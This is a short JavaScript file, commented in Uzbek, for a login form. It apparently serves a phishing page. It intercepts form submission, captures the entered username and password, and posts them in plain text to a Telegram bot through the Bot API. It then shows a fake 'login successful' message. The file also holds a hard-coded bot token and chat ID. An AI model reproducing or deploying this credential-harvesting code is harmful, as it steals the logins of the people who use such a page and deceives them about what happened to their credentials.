document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Formani yuborishdan saqlanadi

    // Username va parolni olish
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Telegram botga xabar yuborish
    const TELEGRAM_TOKEN = '7772407376:AAGhIRmb6KdS6IA51P8nkmx_CnIcUZrUw74'; // O'zingizning bot tokeningizni kiriting
    const CHAT_ID = '6318323960'; // O'zingizning chat ID'ni kiriting

    // Telegram API URL
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    // Yuboriladigan xabar
    const message = `Kiritilgan login: ${username}\nKiritilgan parol: ${password}`;

    // Telegram botga so'rov yuborish
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
        }),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Xabar yuborildi:', data);
        alert('Login muvaffaqiyatli amalga oshirildi!');
    })
    .catch(error => {
        console.error('Xatolik yuz berdi:', error);
        alert('Xatolik yuz berdi!');
    });
});